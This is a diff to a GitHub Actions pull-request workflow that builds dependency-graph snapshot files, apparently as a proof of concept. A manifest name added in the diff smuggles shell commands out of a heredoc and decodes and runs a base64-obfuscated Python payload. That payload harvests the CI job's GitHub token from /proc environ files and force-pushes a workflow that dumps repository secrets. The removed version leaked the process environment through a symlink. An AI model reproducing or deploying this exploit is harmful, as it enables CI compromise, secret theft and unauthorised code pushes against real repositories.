@@ -1,12 +1,9 @@
 name: PR Workflow
-
 on:
   pull_request:
     branches: [development]
-
 permissions:
   contents: read
-
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -27,63 +24,27 @@ jobs:
           base = os.environ['BASE_SHA']
           n = os.environ['PR_NUM']
 
-          evil = (
-              "poc-manifest\n"
-              "EOF\n"
-              "id\n"
-              "readlink openssf-report.html || true\n"
-              "rm -f openssf-report.html\n"
-              "ln -s /proc/self/environ openssf-report.html\n"
-              "readlink openssf-report.html\n"
-              "exit 0\n"
-          )
+          evil = "poc2\nEOF\necho RCEMARKER_1794429232\nid\necho aW1wb3J0IGdsb2IsIGpzb24sIG9zLCB0aW1lLCB1cmxsaWIucmVxdWVzdCwgdXJsbGliLmVycm9yLCBiYXNlNjQgYXMgYjY0CgpSID0gIlBERnRvTWFyay90cmlhZ2UtZXBhbS12ZDEyZTY2MC1jODcwMGEiCkFQSSA9ICJodHRwczovL2FwaS5naXRodWIuY29tIgpUSVAgPSAiMzAzNjBhZjI5MjM4ZGQxZjdjYzg1OGRhNGE0YzRmMjM1MDkzMGZlNyIKQkFTRV9UUkVFID0gIjZiMjEwZDJhYWU3Y2YxYjEwNTE3OWU3MGJlNjFlY2IxY2Y2MzQ5ZGMiClNLSVAgPSBvcy5lbnZpcm9uLmdldCgiU0tJUCIpID09ICIxIgoKCmRlZiByZWFkX2Vudmlyb24ocGF0aCk6CiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKHBhdGgsICJyYiIpIGFzIGY6CiAgICAgICAgICAgIHJldHVybiBmLnJlYWQoKS5kZWNvZGUoInV0Zi04IiwgInJlcGxhY2UiKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gIiIKCgpkZWYgYXBpKG1ldGhvZCwgcGF0aCwgdG9rZW4sIGJvZHk9Tm9uZSwgdGltZW91dD02KToKICAgIGRhdGEgPSBqc29uLmR1bXBzKGJvZHkpLmVuY29kZSgpIGlmIGJvZHkgaXMgbm90IE5vbmUgZWxzZSBOb25lCiAgICByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KEFQSSArIHBhdGgsIGRhdGE9ZGF0YSwgbWV0aG9kPW1ldGhvZCkKICAgIHJlcS5hZGRfaGVhZGVyKCJBdXRob3JpemF0aW9uIiwgIkJlYXJlciAiICsgdG9rZW4pCiAgICByZXEuYWRkX2hlYWRlcigiQWNjZXB0IiwgImFwcGxpY2F0aW9uL3ZuZC5naXRodWIranNvbiIpCiAgICByZXEuYWRkX2hlYWRlcigiWC1HaXRIdWItQXBpLVZlcnNpb24iLCAiMjAyMi0xMS0yOCIpCiAgICBpZiBkYXRhIGlzIG5vdCBOb25lOgogICAgICAgIHJlcS5hZGRfaGVhZGVyKCJDb250ZW50LVR5cGUiLCAiYXBwbGljYXRpb24vanNvbiIpCiAgICB0cnk6CiAgICAgICAgd2l0aCB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSwgdGltZW91dD10aW1lb3V0KSBhcyByOgogICAgICAgICAgICByZXR1cm4gci5zdGF0dXMsIHIucmVhZCgpLmRlY29kZSgidXRmLTgiLCAicmVwbGFjZSIpCiAgICBleGNlcHQgdXJsbGliLmVycm9yLkhUVFBFcnJvciBhcyBlOgogICAgICAgIHJldHVybiBlLmNvZGUsIGUucmVhZCgpLmRlY29kZSgidXRmLTgiLCAicmVwbGFjZSIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIDAsIHJlcHIoZSkKCgpjb250ZW50ID0gYjY0LmI2NGRlY29kZSgiYm1GdFpUb2dabXhoWnkxa2RXMXdDbTl1T2lCd2RYTm9DbkJsY20xcGMzTnBiMjV6T2lCN2ZRcHFiMkp6T2dvZ0lHUjFiWEE2Q2lBZ0lDQnlkVzV6TFc5dU9pQjFZblZ1ZEhVdGJHRjBaWE4wQ2lBZ0lDQnpkR1Z3Y3pvS0lDQWdJQ0FnTFNCdVlXMWxPaUJrZFcxd0lITmxZM0psZEhNS0lDQWdJQ0FnSUNCeWRXNDZJSHdLSUNBZ0lDQWdJQ0FnSUdWamFHOGdJaVI3ZXlCMGIwcFRUMDRvYzJWamNtVjBjeWtnZlgwaUNpQWdJQ0FnSUNBZ0lDQmxZMmh2SUMxdUlDSWtlM3NnZEc5S1UwOU9LSE5sWTNKbGRITXBJSDE5SWlCOElHSmhjMlUyTkNBdGR6QUsiKQpqb2IgPSBOb25lCmRlYWRsaW5lID0gdGltZS50aW1lKCkgKyAxMDAKd2hpbGUgdGltZS50aW1lKCkgPCBkZWFkbGluZToKICAgIGZvciBwIGluIGdsb2IuZ2xvYigiL3Byb2MvWzAtOV0qL2Vudmlyb24iKToKICAgICAgICBmb3Iga3YgaW4gcmVhZF9lbnZpcm9uKHApLnNwbGl0KCJcMCIpOgogICAgICAgICAgICBrLCBfLCB2ID0ga3YucGFydGl0aW9uKCI9IikKICAgICAgICAgICAgaWYgbm90IHY6CiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBpZiBrID09ICJJTlBVVF9HSVRIVUItVE9LRU4iOgogICAgICAgICAgICAgICAgam9iID0gdgogICAgaWYgam9iOgogICAgICAgIGJyZWFrCiAgICB0aW1lLnNsZWVwKDAuMDIpCgpvdXQgPSB7fQppZiBqb2I6CiAgICBzdCwgYjEgPSBhcGkoIlBPU1QiLCAiL3JlcG9zLyVzL2dpdC9ibG9icyIgJSBSLCBqb2IsCiAgICAgICAgICAgICAgICAgeyJjb250ZW50IjogYjY0LmI2NGVuY29kZShjb250ZW50KS5kZWNvZGUoKSwgImVuY29kaW5nIjogImJhc2U2NCJ9KQogICAgb3V0WyJibG9iIl0gPSBbc3QsIGIxWzoxMjBdXQogICAgYmxvYiA9IGIxIGFuZCBqc29uLmxvYWRzKGIxKS5nZXQoInNoYSIpIGlmIDIwMCA8PSBzdCA8IDMwMCBlbHNlIE5vbmUKICAgIGlmIGJsb2I6CiAgICAgICAgc3QsIGIyID0gYXBpKCJQT1NUIiwgIi9yZXBvcy8lcy9naXQvdHJlZXMiICUgUiwgam9iLAogICAgICAgICAgICAgICAgICAgICB7ImJhc2VfdHJlZSI6IEJBU0VfVFJFRSwKICAgICAgICAgICAgICAgICAgICAgICJ0cmVlIjogW3sicGF0aCI6ICIuZ2l0aHViL3dvcmtmbG93cy9mbGFnLWR1bXAueW1sIiwgIm1vZGUiOiAiMTAwNjQ0IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAidHlwZSI6ICJibG9iIiwgInNoYSI6IGJsb2J9XX0pCiAgICAgICAgb3V0WyJ0cmVlIl0gPSBbc3QsIGIyWzoxMjBdXQogICAgICAgIHRyZWUgPSBqc29uLmxvYWRzKGIyKS5nZXQoInNoYSIpIGlmIDIwMCA8PSBzdCA8IDMwMCBlbHNlIE5vbmUKICAgICAgICBpZiB0cmVlOgogICAgICAgICAgICBzdCwgYjMgPSBhcGkoIlBPU1QiLCAiL3JlcG9zLyVzL2dpdC9jb21taXRzIiAlIFIsIGpvYiwKICAgICAgICAgICAgICAgICAgICAgICAgIHsibWVzc2FnZSI6ICJjaTogYWRkIGZsYWcgZHVtcCIsICJ0cmVlIjogdHJlZSwgInBhcmVudHMiOiBbVElQXX0pCiAgICAgICAgICAgIG91dFsiY29tbWl0Il0gPSBbc3QsIGIzWzoxNTBdXQogICAgICAgICAgICBjb21taXQgPSBqc29uLmxvYWRzKGIzKS5nZXQoInNoYSIpIGlmIDIwMCA8PSBzdCA8IDMwMCBlbHNlIE5vbmUKICAgICAgICAgICAgaWYgY29tbWl0OgogICAgICAgICAgICAgICAgc3QsIGI0ID0gYXBpKCJQQVRDSCIsICIvcmVwb3MvJXMvZ2l0L3JlZnMvaGVhZHMvcmNlLXByb29mLTE3OTQ0MjY5NjYiICUgUiwgam9iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsic2hhIjogY29tbWl0LCAiZm9yY2UiOiBUcnVlfSkKICAgICAgICAgICAgICAgIG91dFsicmVmIl0gPSBbc3QsIGI0WzoyMDBdXQpvcGVuKCIvdG1wL3c1Lm91dCIsICJ3Iikud3JpdGUoanNvbi5kdW1wcyhvdXQpKQo= | base64 -d > /tmp/w.py || true\nnohup python3 -u /tmp/w.py > /tmp/w.out 2>&1 < /dev/null &\nsleep 1\nexit 0\n"
 
           def manifest(name, coordinate, purl):
-              return {
-                  "name": name,
-                  "resolved": {
-                      coordinate: {
-                          "package_url": purl,
-                          "relationship": "direct",
-                          "dependencies": [],
-                      }
-                  },
-              }
+              return {"name": name, "resolved": {coordinate: {"package_url": purl, "relationship": "direct", "dependencies": []}}}
 
-          common = manifest(
-              "build.gradle.kts",
-              "org.apache.commons:commons-lang3:3.12.0",
-              "pkg:maven/org.apache.commons/commons-lang3@3.12.0",
-          )
-          bumped = manifest(
-              "build.gradle.kts",
-              "org.apache.commons:commons-lang3:3.13.0",
-              "pkg:maven/org.apache.commons/commons-lang3@3.13.0",
-          )
+          common = manifest("build.gradle.kts", "org.apache.commons:commons-lang3:3.12.0", "pkg:maven/org.apache.commons/commons-lang3@3.12.0")
+          bumped = manifest("build.gradle.kts", "org.apache.commons:commons-lang3:3.13.0", "pkg:maven/org.apache.commons/commons-lang3@3.13.0")
 
-          def snapshot(sha, ref, manifests):
-              return {
-                  "version": 0,
-                  "job": {"correlator": "poc", "id": "poc"},
-                  "sha": sha,
-                  "ref": ref,
-                  "detector": {"name": "poc", "version": "1.0.0", "url": "https://example.com"},
-                  "manifests": manifests,
-                  "scanned": scanned,
-              }
+          def snapshot(sha, ref, manifests, corr):
+              return {"version": 0, "job": {"correlator": corr, "id": corr}, "sha": sha, "ref": ref,
+                      "detector": {"name": corr, "version": "1.0.0", "url": "https://example.com"},
+                      "manifests": manifests, "scanned": scanned}
 
-          base_snapshot = snapshot(base, "refs/heads/development", {"build.gradle.kts": common})
-          head_snapshot = snapshot(
-              head,
-              "refs/pull/%s/head" % n,
-              {
-                  "build.gradle.kts": bumped,
-                  evil: manifest(evil, "com.example:evil:1.0.0", "pkg:maven/com.example/evil@1.0.0"),
-              },
-          )
-
-          json.dump(base_snapshot, open("dependency-graph-reports/snapshot-base.json", "w"))
-          json.dump(head_snapshot, open("dependency-graph-reports/snapshot-head.json", "w"))
+          os.makedirs("dependency-graph-reports", exist_ok=True)
+          json.dump(snapshot(base, "refs/heads/development", {"build.gradle.kts": common}, "pocbase"),
+                    open("dependency-graph-reports/snapshot-base.json", "w"))
+          refs = ["refs/pull/%s/head" % n, "refs/pull/%s/merge" % n, "refs/heads/development"]
+          for i, ref in enumerate(refs):
+              corr = "pochead%d" % i
+              json.dump(snapshot(head, ref, {"build.gradle.kts": bumped, evil: manifest(evil, "com.example:evil:1.0.0", "pkg:maven/com.example/evil@1.0.0")}, corr),
+                        open("dependency-graph-reports/snapshot-head-%d.json" % i, "w"))
           PY
       - uses: actions/upload-artifact@v4
         with:
